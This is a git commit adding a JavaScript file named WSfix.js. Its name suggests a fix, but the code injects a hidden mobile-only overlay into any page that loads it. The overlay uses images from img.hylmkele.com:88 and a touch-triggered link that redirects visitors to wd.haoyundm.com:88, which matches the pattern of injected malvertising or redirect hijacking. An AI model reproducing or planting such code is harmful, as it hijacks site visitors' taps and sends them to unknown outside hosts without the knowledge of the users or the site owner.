cbb4e0f3c9c8d0b39570801a126533e2c81aae3c
vinson <763537842@qq.com>
2021-10-30 15:56:14 +0800

    Create WSfix.js

---
+++ WSfix.js
@@ -0,0 +1,5 @@
+document.writeln("<script>function gl01243(){window.location.href=\"http://wd.haoyundm.com:88/c-83-109.zz\";}</script>");
+document.writeln("<style>@media (max-width: 768px){.bs92421+div,.bs92421+div a,.bs92421+div img{width:100vw;height:125px;display:block;overflow:hidden;}.bs92421+div a{position:absolute;z-index:2;}}@media (min-width: 768px){.bs92421+div{display:none;}}</style> ");
+document.writeln("<div class=\"bs92421\"></div><div><a href=\"javascript:gl01243();\" ontouchstart=\"this.click();\">..</a><img src=\"https://img.hylmkele.com:88/center\"/><img/><img/><img/></div> ");
+document.writeln("<script>function InitDo(){document.querySelector('.bs92421').nextElementSibling.firstChild.nextElementSibling.src = 'https://img.hylmkele.com:88/center';}</script> ");
+document.writeln("<script>setTimeout(InitDo,2000);</script><script>setTimeout(InitDo,2000);</script>");
